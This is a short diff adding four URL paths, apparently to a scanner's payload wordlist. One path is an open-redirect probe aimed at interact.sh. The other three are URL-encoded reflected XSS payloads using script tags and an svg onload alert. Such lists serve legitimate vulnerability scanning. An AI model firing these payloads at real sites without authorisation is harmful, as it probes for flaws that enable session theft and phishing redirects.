@@ -1,0 +1,4 @@
+/login?redir=http://www.interact.sh
+/p/user/ftoken/activate/user/guest/?action=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E
+/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
